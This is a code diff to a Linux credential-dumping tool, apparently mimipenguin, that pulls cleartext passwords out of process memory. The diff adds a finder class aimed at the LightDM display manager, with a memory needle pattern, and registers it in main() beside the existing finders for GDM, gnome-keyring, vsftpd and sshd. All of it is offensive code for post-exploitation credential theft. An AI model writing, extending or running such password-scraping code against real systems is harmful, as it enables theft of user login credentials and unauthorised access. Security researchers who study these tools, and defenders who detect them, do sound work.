@@ -183,6 +183,12 @@ class GnomeKeyringPasswordFinder(PasswordFinder):
         self._target_processes = ['gnome-keyring-daemon']
         self._needles = [r'^.+libgck\-1\.so\.0$', r'libgcrypt\.so\..+$']
 
+class LightDmPasswordFinder(PasswordFinder):
+    def __init__(self):
+        PasswordFinder.__init__(self)
+        self._source_name = '[SYSTEM - LIGHTDM]'
+        self._target_processes = ['lightdm']
+        self._needles = [r'^_pammodutil_getspnam_']
 
 class VsftpdPasswordFinder(PasswordFinder):
     def __init__(self):
@@ -242,6 +248,8 @@ def main():
         password_finders.append(GdmPasswordFinder())
     if find_pid('gnome-keyring-daemon'):
         password_finders.append(GnomeKeyringPasswordFinder())
+    if find_pid('lightdm'):
+        password_finders.append(LightDmPasswordFinder())
     if os.path.isfile('/etc/vsftpd.conf'):
         password_finders.append(VsftpdPasswordFinder())
     if os.path.isfile('/etc/ssh/sshd_config'):
